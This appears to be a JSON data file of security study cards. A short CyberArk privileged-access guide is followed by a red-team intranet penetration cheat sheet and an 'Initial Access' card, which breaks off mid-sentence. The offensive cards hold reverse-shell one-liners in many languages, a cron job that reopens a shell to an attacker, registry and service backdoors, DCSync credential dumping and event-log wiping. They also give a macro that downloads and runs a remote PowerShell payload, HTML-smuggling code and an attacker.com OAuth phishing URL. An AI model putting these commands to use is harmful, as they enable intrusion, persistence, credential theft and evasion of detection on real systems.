[
  {
    "name": "Cyber ARK",
    "description": "CyberArk — Complete Privileged Access Management Guide",
    "category": "Cloud Security",
    "color": "#400080",
    "tags": [
      "cyber defeance"
    ],
    "articles": [
      {
        "title": " CyberArk --- Complete Privileged Access Management (PAM) Guide",
        "content": "# 🛡️ CyberArk --- Complete Privileged Access Management (PAM) Guide\n\n------------------------------------------------------------------------\n\n## 1️⃣ ℹ️ What it is / ❓Why it matters\n\n**CyberArk** is a **Privileged Access Management (PAM)** solution\ndesigned to **secure, manage, and monitor privileged accounts** used by\nadministrators, applications, and automated systems.\n\nPrivileged accounts (like domain admins or root users) have unrestricted\naccess --- if compromised, they can lead to full environment takeover.\\\nCyberArk ensures these accounts are **secured, rotated, and monitored**\ncontinuously.\n\n------------------------------------------------------------------------\n\n## 2️⃣ 💡 Key Uses of CyberArk\n\n  -----------------------------------------------------------------------\n  Area                  Description\n  --------------------- -------------------------------------------------\n  🔐 **Credential       Securely stores privileged account passwords and\n  Vaulting**            secrets.\n\n  🔄 **Password         Automatically changes credentials after each use\n  Rotation**            or set period.\n\n  🧑‍💻 **Session          Monitors and records admin sessions for audit and\n  Management**          compliance.\n\n  🧱 **Least Privilege  Removes local admin rights and provides temporary\n  Enforcement**         elevation.\n\n  🧰 **API &            Manages service accounts, SSH keys, and API\n  Application           secrets.\n  Integration**         \n\n  ☁️ **Cloud Security** Extends PAM to AWS, Azure, and GCP privileged\n                        identities.\n\n  🧾 **Compliance &     Provides detailed audit trails for privileged\n  Reporting**           access.\n  -----------------------------------------------------------------------\n\n------------------------------------------------------------------------\n\n## 3️⃣ 🧩 Core Components of CyberArk\n\n  -----------------------------------------------------------------------\n  Component                              Purpose\n  -------------------------------------- --------------------------------\n  **Vault (Digital Vault)**              Central encrypted storage for\n                                         privileged credentials.\n\n  **PVWA (Password Vault Web Access)**   Web interface for admins and\n                                         users to manage safes and\n                                         accounts.\n\n  **CPM (Central Policy Manager)**       Rotates and enforces password\n                                         policies across systems.\n\n  **PSM (Privileged Session Manager)**   Monitors, records, and controls\n                                         privileged user sessions.\n\n  **PSMP (Privileged Session Manager     Provides secure access for\n  Proxy)**                               remote or external users.\n\n  **AIM (Application Identity Manager)** Allows applications to retrieve\n                                         credentials securely via API.\n\n  **EPM (Endpoint Privilege Manager)**   Manages least privilege and\n                                         application control on\n                                         endpoints.\n  -----------------------------------------------------------------------\n\n------------------------------------------------------------------------\n\n## 4️⃣ ⚙️ Common CyberArk Policies\n\nCyberArk policies define **how credentials are stored, rotated, and\naccessed.**\n\n  -----------------------------------------------------------------------\n  Policy Type                         Description\n  ----------------------------------- -----------------------------------\n  🔄 **Password Management Policy**   Defines rotation frequency,\n                                      complexity, and platform rules.\n\n  🔐 **Access Control Policy**        Controls who can access safes,\n                                      accounts, and sessions.\n\n  🕵️ **Session Recording Policy**     Enables video and keystroke\n                                      recording for admin activities.\n\n  🧑‍💼 **Dual Control Policy**          Requires two-person approval for\n                                      high-risk credential access.\n\n  🧱 **Least Privilege Policy (EPM)** Manages elevation and whitelisting\n                                      on endpoints.\n\n  ☁️ **Cloud Account Policy**         Handles key rotation and access for\n                                      cloud environments.\n\n  🧾 **Compliance Policy**            Ensures audit logs, alerts, and\n                                      retention are configured.\n  -----------------------------------------------------------------------\n\n------------------------------------------------------------------------\n\n## 5️⃣ 💻 Step-by-step Commands (REST API Examples)\n\n### 🔐 Log in to PVWA\n\n``` bash\ncurl -X POST \"https://<PVWA_URL>/PasswordVault/API/Auth/CyberArk/Logon\" -H \"Content-Type: application/json\" -d \"{\"username\":\"Admin\",\"password\":\"<YourPassword>\"}\"\n```\n\n### 📂 List all safes\n\n``` bash\ncurl -X GET \"https://<PVWA_URL>/PasswordVault/API/Safes\" -H \"Authorization: Bearer <token>\"\n```\n\n### 🔑 Retrieve password from a safe\n\n``` bash\ncurl -X GET \"https://<PVWA_URL>/PasswordVault/API/Accounts/<AccountID>/Password/Retrieve\" -H \"Authorization: Bearer <token>\"\n```\n\n### 🔄 Rotate password\n\n``` bash\ncurl -X POST \"https://<PVWA_URL>/PasswordVault/API/Accounts/<AccountID>/Change\" -H \"Authorization: Bearer <token>\"\n```\n\n------------------------------------------------------------------------\n\n## 6️⃣ 👀 What to expect\n\n✅ **Successful Login** → Returns session token\\\n✅ **List Safes** → JSON with Safe names and access info\\\n✅ **Retrieve Password** → Returns temporary credential string\\\n✅ **Rotation Command** → Status: `\"success\"` after password update\n\nSample:\n\n``` json\n{\n  \"Safes\": [\n    {\"SafeName\": \"Domain_Admins\", \"NumberOfAccounts\": 8},\n    {\"SafeName\": \"SQL_Admins\", \"NumberOfAccounts\": 5}\n  ]\n}\n```\n\n------------------------------------------------------------------------\n\n## 7️⃣ ⚠️ Troubleshooting & 📝 Tips\n\n### Common Errors\n\n  Error                 Cause                      Fix\n  --------------------- -------------------------- ------------------------------\n  401 Unauthorized      Token expired or invalid   Log in again\n  403 Forbidden         Access denied              Request permission for safe\n  500 Server Error      PVWA service issue         Restart PVWA service\n  CPM Rotation Failed   Policy mismatch            Check platform configuration\n\n### Tips\n\n-   🧠 Use **AppIDs** or **cert-based authentication** instead of\n    passwords for automation.\\\n-   📊 Regularly **review vault audit logs** for anomalies.\\\n-   🔄 Schedule password rotation during low-usage hours.\\\n-   🧱 Enable **MFA for PVWA login**.\\\n-   🧰 Integrate CyberArk with **SIEM** for real-time alerts.\n\n------------------------------------------------------------------------\n\n## 8️⃣ 🧭 Best Practices\n\n-   Enforce **least privilege** across all accounts.\\\n-   Rotate credentials every 24 hours or after each use.\\\n-   Use **platform-based policies** per OS and application type.\\\n-   Enable **session monitoring** for all privileged users.\\\n-   Keep the **Vault isolated** from the main network with dedicated\n    hardware.\n\n------------------------------------------------------------------------\n\n## 9️⃣ 🛡️ Safety / Ethics Note\n\nCyberArk manages **the most powerful credentials** in any environment.\\\nImproper access or manipulation can lead to **data loss or system\ncompromise**.\\\n- ⚖️ Always operate under proper authorization.\\\n- 🧾 Follow internal compliance, audit, and logging requirements.\\\n- 🚫 Never extract or share passwords outside secure channels.\\\n- 🔐 Ensure encryption keys are stored securely and backed up.\n\n------------------------------------------------------------------------\n\n## 🔚 Summary\n\nCyberArk provides end-to-end **privileged access security**, combining\nvaulting, automation, monitoring, and least privilege management.\\\nIt is a critical tool for **Zero Trust**, **compliance**, and **identity\nsecurity** strategies in any enterprise environment.\n\n------------------------------------------------------------------------\n\n*Created for cybersecurity study and practical lab documentation.*\n"
      }
    ]
  },
  {
    "name": "Red Team Cheetsheet",
    "description": "The valuable information of the red teamer.",
    "category": "Malware Analysis",
    "color": "#ce2024",
    "tags": [
      "cyber defeance"
    ],
    "articles": [
      {
        "title": "Intranet Penetration Cheat‑Sheets",
        "content": "# Intranet Penetration Cheat‑Sheets  \n*Modified by: [z3r0yu](https://twitter.com/zeroyu_)*  \n*Blog: <http://zeroyu.xyz>*  \n\n---  \n\n## Table of Contents  \n\n1. [Information Gathering](#information-gathering)  \n   - Open‑Source Intelligence (OSINT)  \n   - Building a corporate password dictionary  \n2. [Getting Inside the Intranet](#getting‑inside‑the‑intranet)  \n   - Weak credential exploits  \n   - System‑vulnerability exploits  \n   - Web‑application attacks  \n   - Wireless / Wi‑Fi access  \n3. [Stealthy Attack (C2, Fronting, Proxy)](#stealth‑attack)  \n4. [In‑network Pivoting & Cross‑boundary Access](#pivoting)  \n5. [Internal Reconnaissance](#internal‑recon)  \n6. [Privilege Escalation](#priv‑escalation)  \n7. [Persistence](#persistence)  \n8. [Lateral Movement](#lateral‑movement)  \n9. [Evidence Cleanup](#cleanup)  \n\n---  \n\n## 1. Information Gathering  \n\n### 1.1 Open‑Source Intelligence (OSINT)  \n\n| Category | Tools / Resources | Notes |\n|----------|-------------------|-------|\n| **GitHub** | `Github_Nuggests` – auto‑scrape sensitive files<br>`GSIL` – near‑real‑time (≤15 min) GitHub leaks<br>`x‑patrol` (Mi Security) | https://github.com/az0ne/Github_Nuggests<br>https://github.com/FeeiCN/GSIL |\n| **Whois / Registrant / Email / Asset** | 站长之家 – <http://whois.chinaz.com/><br>爱站 – <https://whois.aizhan.com/><br>微步在线 – <https://x.threatbook.cn/><br>IP reverse‑lookup – <https://dns.aizhan.com/><br>天眼查 – <https://www.tianyancha.com/><br>虎妈查 – <http://www.whomx.com/><br>Historical vulnerability DB: <http://wy.zone.ci/> (online) or self‑host <https://github.com/hanc00l/wooyun_publi/> | |\n| **Google Hacking** | Use `site:target.com` + dork strings to discover exposed directories, login pages, etc. | |\n\n### 1.2 Building a Corporate Password Dictionary  \n\n#### 1.2.1 Wordlists  \n\n| Source | Link |\n|--------|------|\n| `passwordlist` | https://github.com/lavalamp-/password-lists |\n| “猪猪侠” dictionary (Chinese) | https://pan.baidu.com/s/1dFJyedz |\n| `Blasting_dictionary` – assorted weak‑pwd, dir‑brute, DB‑brute, etc. | https://github.com/rootphantomer/Blasting_dictionary |\n| Vendor‑specific dictionaries – manually construct based on known naming conventions (e.g., `['%pwd%123','%user%123',…]`) | *see example in original* |\n\n#### 1.2.2 Password Generation  \n\n| Tool | Description |\n|------|--------------|\n| **GenpAss** – China‑style weak‑pwd generator | https://github.com/RicterZ/genpAss |\n| **passmaker** – custom rule generation | https://github.com/bit4woo/passmaker |\n| **pydictor** – powerful generator | https://github.com/LandGrey/pydictor |\n| **BaiLu‑SED‑Tool** – social‑engineering dictionary generator | https://github.com/HongLuDianXue/BaiLu-SED-Tool |\n\n#### 1.2.3 Email Harvesting  \n\n| Tool | Link |\n|------|------|\n| **theHarvester** | https://github.com/laramies/theHarvester |\n| **LinkedInt** (LinkedIn enumeration) | https://github.com/mdsecactivebreach/LinkedInt |\n| **Mailget** | https://github.com/Ridter/Mailget |\n\n#### 1.2.4 Leaked‑Password Search  \n\n| Service | Link |\n|---------|------|\n| **GhostProject** | https://ghostproject.fr/ |\n| **pwndb** (Tor) | https://pwndb2am4tzkvold.onion.to/ |\n\n#### 1.2.5 Encrypted‑Password Cracking  \n\n| Tool | Description |\n|------|-------------|\n| **pwcrack‑framework** – auto‑detect hash type and crack | https://github.com/L-codes/pwcrack-framework |\n\n#### 1.2.6 External Recon – Sub‑domain Enumeration  \n\n| Tool / Service | Link |\n|----------------|------|\n| **Layer子域名挖掘机 4.2** (Chinese) | – |\n| **subDomainsBrute** | https://github.com/lijiejie/subDomainsBrute |\n| **wydomain** | https://github.com/ring04h/wydomain |\n| **Sublist3r** | https://github.com/aboul3la/Sublist3r |\n| **Google site:** `site:target.com` | https://www.google.com |\n| **OneForAll** | https://github.com/shmilylty/OneForAll |\n| **CRT.sh, Censys, Shodan, ZoomEye, Fofa** – certificate / sub‑domain search | https://crt.sh/?q=%25.target.com, https://censys.io/, https://shodan.io/, https://zoomeye.org/, https://fofa.so/ |\n| **DNSAXFR (Linux)** `dig @ns.example.com example.com AXFR` | |\n| **NSLOOKUP (Windows)** `nslookup -type=ns target.com` → `ls target.com` | |\n| **Additional APIs** – hackertarget, riskiq, dnsdb, etc. | See original list for URLs |\n\n---  \n\n## 2. Getting Inside the Intranet  \n\n| Technique | Typical Entry Point | Example Tools |\n|-----------|--------------------|---------------|\n| **Weak corporate accounts** | Default/weak credentials (e.g., `admin/123456`) | Hydra, Medusa, CrackMapExec |\n| **System vulnerabilities** | Unpatched Windows/Linux services (SMB, MSSQL, etc.) | Metasploit, Exploit‑DB scripts |\n| **Web‑application attacks** | SQLi, LFI, RCE, mis‑configured admin panels | sqlmap, XSStrike, DirBuster |\n| **Wi‑Fi compromise** | WPA/WPA2‑PSK cracking, rogue APs | aircrack‑ng, hostapd‑wpe, EvilAP |\n\n---  \n\n## 3. Stealthy Attack  \n\n| Category | Description | References |\n|----------|-------------|------------|\n| **Command & Control (C2)** | Use encrypted channels, DNS/Tunnel, HTTP(S), custom protocols | |\n| **Fronting** | Hide traffic behind legitimate domains (e.g., Cloudflare, CDN) | <https://evi1cg.me/archives/Domain_Fronting.html> |\n| **Proxy** | HTTP/SOCKS proxies, tunnelling tools (frp, nps, stowaway, EW, Termite) | See **Proxy Setup** below |\n\n---  \n\n### 3.1 Proxy / Tunnel Setup  \n\n| Tool | Quick Config |\n|------|--------------|\n| **frp** (fast reverse proxy) | `frps.ini` → bind 0.0.0.0:7000, token = test, dashboard_port = 7500, allow_ports = 40000-50000<br>`frpc.ini` → server_addr = YOUR.VPS, server_port = 7000, token = test, tls_enable = true, plugins for http/socks5 | |\n| **nps** | <https://github.com/ehang-io/nps> – similar to frp |\n| **stowaway** – supports UDP, stable | `admin: ./stowaway_admin -l 9999`<br>`agent: ./stowaway_agent -c 127.0.0.1:9999 --reconnect 10` |\n| **EW (EarthWorm)** – forward SOCKS5 / multi‑hop | `./ew -s ssocksd -l 1080` (server)<br>`./ew -s rssocks -d 1.1.1.1 -e 8888` (client) |\n| **Termite** – lightweight reverse tunnel | <https://rootkiter.com/Termite/> |\n| **ProxyChains** – force every command through proxy | `proxychains4 -q bash` |\n| **Neo‑reGeorg** – HTTP/HTTPS tunneling | `python3 neoreg.py -k pwd -u http://target/tunnel.php` |\n| **chisel** – TCP tunneling (also SharpChisel for C#) | <https://github.com/jpillora/chisel> |\n| **mssqlproxy** – use MSSQL CLR channel for C2 when only MSSQL is open | <https://github.com/blackarrowsec/mssqlproxy> |\n| **ligolo** – lightweight TLS‑encrypted SOCKS5 proxy | <https://github.com/FunnyWolf/ligolo> |\n\n---  \n\n## 4. In‑network Pivoting / Cross‑Boundary  \n\n| Technique | Typical Use | Example |\n|-----------|-------------|---------|\n| **In‑network forwarder** | Forward traffic from compromised host to other sub‑nets | `ssh -L local:remote:port user@compromised` |\n| **Proxy‑based pivot** | Use tools like **EW**, **Termite**, **frp**, **nps** | See **Proxy Setup** above |\n| **Shell rebounce** | Reverse / bind shells via various languages (bash, perl, python, php, ruby, java, nc, lua, sctp, powershell) | See **Shell Rebound** snippet below |\n| **File transfer** | `wget / curl / powershell / certutil / bitsadmin / scp / rsync / nc` | Detailed commands in **File Transfer** section |\n| **Simple HTTP server** | Quick file host for payloads | `python -m http.server 8000` (Python 3) |\n\n### 4.1 Shell Rebound (quick cheat sheet)\n\n| Language | One‑liner |\n|----------|----------|\n| **Bash** | `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` |\n| **Perl** | `perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'` |\n| **Python** | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'` |\n| **PHP** | `php -r '$s=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'` |\n| **Ruby** | `ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'` |\n| **Java** | *see original snippet* |\n| **NC (with -e)** | `nc -e /bin/sh 1.2.3.4 1234` |\n| **NC (without -e)** | `mknod /tmp/backpipe p; /bin/sh 0/tmp/backpipe | nc attacker 1234 1>/tmp/backpipe` |\n| **Lua** | `lua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');\"` |\n| **SCTP (sctp‑shell)** | Server: `sudo ./sctp-shell -s -lp 443 -a 192.168.0.189`<br>Client: `./sctp-shell -a 192.168.0.189 -lp 56738 -rp 443` |\n| **PowerShell (full interactive)** | Server: `stty raw -echo; (stty size; cat) | nc -lvnp 3001`<br>Client: `IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001` |\n\n---  \n\n## 5. Internal Reconnaissance  \n\n### 5.1 Host‑level Information  \n\n| Item | Windows Command | Linux Equivalent |\n|------|-----------------|------------------|\n| **User list** | `net user` | `cat /etc/passwd` |\n| **Process list** | `tasklist /svc` | `ps aux` |\n| **Service list** | `sc query` | `systemctl list‑units --type=service` |\n| **Port list** | `netstat -ano` / `Get-NetTCPConnection` | `netstat -tunlp` |\n| **Patch / KB list** | `wmic qfe list` | `dpkg -l` / `rpm -qa` |\n| **Local shares** | `net share` | `smbclient -L localhost -N` |\n| **User habits** (history, favorites) | `type %APPDATA%\\Microsoft\\Windows\\Recent\\*` | `~/.bash_history`, `~/.zsh_history` |\n| **Credential dumpers** | Mimikatz, LaZagne, etc. | LaZagne, mimipenguin, etc. |\n\n### 5.2 Lateral Discovery  \n\n| Task | Tools / Commands |\n|------|------------------|\n| **Port scan** | `nmap`, `masscan`, `zmap`, `Perun`, `AssetScan`, `ServerScan`, `netscan`, `fscan` |\n| **NetBIOS / SMB info** | `nbtstat -A <IP>`, `smbclient -L //<IP>/ -N` |\n| **Network topology** | Identify DMZ / Mgmt / Prod / Test segments via routing tables (`route print` / `ip route`) |\n| **Common reconnaissance commands** | `ipconfig /all`, `net view /domain`, `dsquery`, `query user`, `tasklist /svc`, `net use \\\\DC\\share …` |\n| **Third‑party info** | NetBIOS, SMB, empty sessions, DNS zone transfers, custom DNS‑over‑TCP proxies (see *DNS‑TCP‑Socks* project) |\n| **File‑search** | `SharpSearch`, `grep -R`, `find` |\n\n---  \n\n## 6. Privilege Escalation  \n\n### 6.1 Windows  \n\n| Category | Tools / Methods |\n|----------|-----------------|\n| **UAC bypass** | IFileOperation COM, `wusa.exe` extract, DLL hijack, `eventvwr.exe`/registry hijack, `sdclt.exe`, `cmstp.exe`, environment‑variable hijack, CLSID hijack, direct bypass. <br>**Tools:** `UACME`, `Bypass-UAC`, `Yamabiko` |\n| **AMSI bypass** | Patch in‑memory, replace `AmsiScanBuffer`. <br>**Tools:** `AmsiScanBufferBypass`, `NetLoader` |\n| **Kernel exploits** | Use `Windows‑Exploit‑Suggester`, `wesng`, `BeRoot` for vulnerable kernel versions. |\n| **Service abuse** | `Juicy Potato`, `PrintNightmare (CVE‑2020‑1337)`, mis‑configured services. |\n| **Mis‑configured system services / registry** | Search for insecure permissions, edit ACLs. |\n| **Scheduled Tasks** | Abuse `schtasks` with SYSTEM binaries. |\n| **SUID / sticky bits** | Not applicable on Windows. |\n| **Credential dumping** | `mimikatz`, `lsadump`, `lsadump::lsa`, `lsadump::dcsync`, `kerberos::golden`, `kerberos::ptt`. |\n| **Escalation scripts** | `PowerUp`, `ElevateKit`, `Sherlock` |\n\n### 6.2 Linux  \n\n| Category | Tools / Commands |\n|----------|------------------|\n| **Kernel exploits** | `linux‑kernel‑exploits` repo |\n| **Cron / scheduled jobs** | `crontab -l`, inspect `/etc/crontab`, `/etc/cron.*` |\n| **SUID binaries** | `find / -perm -4000 2>/dev/null` |\n| **Service mis‑config** | Review config files (`/etc/apache2/config.inc`, `/var/lib/mysql/mysql/user.MYD`, …) |\n| **World‑readable files** | Check history files (`~/.bash_history`, `~/.ssh/known_hosts`, …) |\n| **Plain‑text credentials** | `grep -iE 'user|pass' -R /path/` |\n| **Privilege‑escalation scripts** | `linux‑privilege‑escalation` collection, `LinEnum`, `Linux Exploit Suggester` |\n\n---  \n\n## 7. Persistence  \n\n### 7.1 Windows Persistence Mechanisms  \n\n| Persistence Vector | Typical Registry / File Path | Example Command |\n|--------------------|------------------------------|-----------------|\n| **Run / RunOnce (HKCU/HKLM)** | `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` | `reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v MyApp /t REG_SZ /d \"C:\\malicious.exe\"` |\n| **BootExecute** | `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute` | |\n| **Userinit** | `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit` | |\n| **Startup Folder** | `%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` | |\n| **Services** | `sc create evilsvc binPath= \"C:\\evil.exe\"` | |\n| **Browser Helper Objects (BHO)** | `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects` | |\n| **AppInit_DLLs** | `HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs` | |\n| **File‑type association** | `HKCR\\.exe\\Shell\\Open\\Command` | |\n| **Bitsadmin** | `bitsadmin /create backdoor /addfile backdoor %COMSPEC% %temp%\\cmd.exe /setnotifycmdline backdoor regsvr32.exe \"/u /s /i:http://host/calc.sct scrobj.dll\"` | |\n| **MOF (WMI Event Subscription)** | `mofcomp malicious.mof` | |\n| **WMI Event Consumer** | `wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE …` | |\n| **Scheduled‑Task “UserTask” hijack** | `HKCU\\Software\\Classes\\CLSID\\<GUID>\\InprocServer32` → set default value to payload | |\n| **Netsh helper DLL** | `netsh add helper C:\\payload.dll` | |\n| **Application Compatibility Shim** | Inject DLL, redirect exe/shortcut | |\n| **DLL Hijacking** | Place malicious DLL in program’s search path or use Rattler tool for automation | |\n| **DoubleAgent (AppVerifier)** | Register custom verifier DLL to launch payload at process start | |\n| **waitfor.exe** (remote activation) | `waitfor /si EvilTask` + `waitfor /ti EvilTask` | |\n| **AppDomainManager (dotNET)** | Edit `HKLM\\Software\\Microsoft\\.NETFramework\\AppDomainManagerAssembly` | |\n| **Office macro / VSTO / COM Add‑ins** | Add malicious macro, custom COM add‑in | |\n| **CLR injection** | Load malicious assembly into any .NET process | |\n| **MSDTC DLL load** | Drop `oci.dll` to `%windir%\\system32` and register with MSDTC | |\n| **COM Object hijacking** (e.g., `CAccPropServicesClass`) | Change CLSID registration to point to malicious DLL | |\n| **Explorer.exe hijack** | Replace `explorer.exe` COM objects in HKCU\\Software\\Classes\\CLSID | |\n| **FAX DLL injection** | Place DLL as `fxsst.dll` (loaded by Windows Fax) | |\n| **Hidden registry keys** (native‑API only) | Use undocumented registry value names | |\n| **LNK shortcut backdoor** | Modify `.lnk` to execute payload | |\n| **Logon Scripts** | `HKCU\\Environment\\UserInitMprLogonScript` → script path | |\n| **Password‑filter DLL** | Replace `PasswordFilter.dll` to capture new passwords | |\n| **BHO (Browser Helper Object)** | Load malicious DLL into IE | |\n| **SharPersist** (PowerShell) | https://github.com/fireeye/SharPersist |\n\n### 7.2 Linux Persistence  \n\n| Method | Description |\n|--------|-------------|\n| **Cron jobs** | `crontab -l; echo \"*/60 * * * * /bin/bash -i >& /dev/tcp/attacker/53 0>&1\" | crontab -` |\n| **Hard‑link `sshd`** | `ln -sf /usr/sbin/sshd /tmp/ssh && /tmp/ssh -p 2333` |\n| **SSH wrapper** (replace binary with a script that spawns a shell) | |\n| **SSH keylogger** (alias `ssh` to `strace`) | |\n| **Process‑injection backdoors** (`cymothoa`, `Vegile`) | |\n| **Rootkits** (openssh, kbeast, etc.) | |\n| **Persistence tools** (`Vegile`, `backdoor`) | |\n\n---  \n\n## 8. Lateral Movement  \n\n### 8.1 Port‑focused Lateral  \n\n| Goal | Tools |\n|------|-------|\n| **Port scanning** | `nmap`, `masscan`, `zmap`, `Perun`, `AssetScan`, `ServerScan`, `netscan`, `fscan` |\n| **Brute‑forcing** | `hydra`, `crowbar`, `PortBrute` |\n| **Weak‑password scanning** | `NTScan`, `Hscan` |\n| **Exploit/overflow** | Specific CVEs per service (e.g., `MS08‑067`, `MS17‑010`, etc.) |\n| **Common default ports** | See list in original – web (80/8000‑9090), DB (1433, 1521, 3306, …), special services (445, 6379, 7001, 9200, …) |\n\n### 8.2 Domain / Active Directory  \n\n| Phase | Tool / Command | Remarks |\n|-------|----------------|---------|\n| **Discovery** | `Get‑NetDomain`, `Get‑NetForest`, `Get‑NetDomainControllers`, `Get‑NetUser`, `Get‑NetGroup`, `Get‑NetComputers`, `Get‑NetShare`, `Get‑NetLoggedon`, `Get‑NetSessions`, `Get‑NetProcesses` (PowerView) | |\n| **Visualization** | **BloodHound** – graph AD relationships | |\n| **DNS enumeration** | `adidnsdump`, `dns‑zonefile` (export) | |\n| **Domain‑controller enumeration** | **SYSVOL** shares, `net view \\\\DC`, `dir \\\\DC\\SYSVOL` | |\n| **Kerberos abuses** | `MS14‑068` (kekeo), **Kerberoasting** (`setspn -Q */*` → harvest SPNs), **Golden Ticket** (`mimikatz \"privilege::debug\" \"lsadump::dcsync /domain:corp /user:krbtgt\"`), **Silver Ticket** (TGS forging) | |\n| **NTLM Relay** | `privexchange`, `exchange2domain`, `ntlmrelayx` | |\n| **Delegation abuse** | `s4u2pwnage`, **Wagging‑the‑Dog**, **CVE‑2019‑1040** | |\n| **Domain hash dumping** | VSS + `ntdsutil` → `NTDS.DIT`, `Invoke‑NinjaCopy`, Mimikatz `lsadump::lsa` | |\n| **Persistence in AD** | **DCShadow**, **SID‑History**, **AdminSDHolder**, **Group Policy** abuse, **Security Support Provider (SSP)** hijack, **PasswordChangeNotify** hook, **Kerberoasting backdoor** | |\n| **Tools** | `BloodHound`, `CrackMapExec`, `DeathStar`, `SharpWMI`, `goWMIExec` | |\n\n### 8.3 Remote Execution  \n\n| Method | Typical Command |\n|--------|-----------------|\n| **PsExec / SMBExec** | `psexec \\\\target -u user -p pass cmd.exe` |\n| **WMIC** | `wmic /node:target process call create \"cmd.exe\"` |\n| **Smbexec** (Impacket) | `smbexec.py user:pass@target cmd.exe` |\n| **PowerShell Remoting** | `Enter-PSSession -ComputerName target -Credential (Get-Credential)` |\n| **WinRM** | `evil-winrm -i target -u user -p pass` |\n| **DCOM** | `wmiexec.py user:pass@target` |\n| **SharpWMI** | C# tool for WMI exec via 135 |\n| **goWMIExec** | Pure‑Go implementation (no Impacket) |\n\n### 8.4 IoT / Embedded Devices  \n\n| Device | Tool |\n|--------|------|\n| **Routers** | `routersploit` |\n| **Printers** | `PRET` |\n| **General IoT** | <https://www.exploitee.rs/> |\n| **Frameworks** | **OWASP‑Nettacker**, **isf**, **icsmaster** |\n\n### 8.5 Man‑in‑the‑Middle  \n\n| Tool | Primary Use |\n|------|--------------|\n| **Cain & Abel** | Credential sniffing |\n| **Ettercap** | ARP‑poisoning, packet capture |\n| **Responder** | LLMNR/NBT‑NS/MDNS poisoning |\n| **MITMf / Bettercap** | Advanced MITM (proxy, credential capture) |\n\n### 8.6 AV / Applocker Bypass  \n\n| Bypass Type | Resources |\n|-------------|-----------|\n| **Applocker** | <https://github.com/api0cradle/UltimateAppLockerByPassList>, <https://lolbas-project.github.io/> |\n| **AV evasion** | `Empire`, `PEspin`, `Shellter`, `Ebowla`, `Veil`, PowerShell obfuscation, Process Doppelgänging, `Disable-Windows-Defender` script |\n\n---  \n\n## 9. Evidence Cleanup  \n\n### 9.1 Windows Event Log Clearance  \n\n```cmd\nrem List all log names\nwevtutil el > logs.txt\n\nrem Show statistics for a specific log\nwevtutil gli \"Windows PowerShell\"\n\nrem Export all entries (text)\nwevtutil qe /f:text \"Windows PowerShell\"\n\nrem Clear a log\nwevtutil cl \"Windows PowerShell\"\n```\n\n*You can also use PowerShell’s `Clear-EventLog`.*\n\n### 9.2 Disabling Log Recording  \n\n- **Invoke‑Phant0m** – disables EventLog service.  \n- **Windwos‑EventLog‑Bypass** – patches kernel structures.  \n\n### 9.3 Metasploit Clean‑up  \n\n```bash\nrun clearlogs      # clears all events\nclearev            # alternative command\n```\n\n### 9.4 RDP (3389) Log Clean‑up  \n\n```cmd\n@echo off\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\ndel \"%USERPROFILE%\\My Documents\\Default.rdp\" /a\nexit\n```\n\n---  \n\n### End of Cheat‑Sheet  \n\n*Feel free to edit, add more tools, or adapt commands to your environment. All links are current as of the time of writing.*"
      },
      {
        "title": "Initial Access ",
        "content": "## Initial Access 🛬\n\n### Phishing (Spear, Maldoc)\n\n**What it is / Why it matters:** Social engineering attacks that use email to deliver malicious content. This is the most common initial access vector, often bypassing technical controls by targeting human vulnerabilities.\n\n**Quick Steps / Commands:**\n\n*   **Malicious Word Macro (Maldoc):**\n\n    ```vba\n    ' Create .docm file with VBA macro\n    Sub AutoOpen()\n        Dim str As String\n        str = \"powershell -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1'))\"\n        Shell str, vbHide\n    End Sub\n\n    ' Alternative for different Office versions\n    Sub Document_Open()\n        AutoOpen\n    End Sub\n\n    Sub Workbook_Open()\n        AutoOpen\n    End Sub\n    ```\n\n*   **HTML Smuggling:**\n\n    ```html\n    <script>\n    const blob = new Blob([atob(\"BASE64_PAYLOAD\")], { type: 'application/octet-stream' });\n    const url = URL.createObjectURL(blob);\n    const a = document.createElement(\"a\");\n    a.href = url;\n    a.download = \"Invoice.pdf.exe\";\n    document.body.appendChild(a);\n    a.click();\n    document.body.removeChild(a);\n    </script>\n    ```\n\n*   **Consent Phishing (OAuth Abuse):**\n\n    ```bash\n    # Register malicious Azure app with high permissions\n    # Craft authorization URL:\n    https://login.microsoftonline.com/common/oauth2/v2.0/authorize?\n    client_id=MALICIOUS_APP_ID&\n    response_type=code&\n    redirect_uri=https://attacker.com/callback&\n    scope=Mail.Read+Files.Read.All+offline_access\n    ```\n\n**What to Expect:** The user executes the macro or clicks the malicious link, leading to shell access. Success depends on effective social engineering and the organization's security controls.\n\n**Detection / Hardening:**\n\n*   Block macros from internet files via GPO\n*   Monitor `winword.exe` → `powershell.exe` process chains\n*   Email filtering for 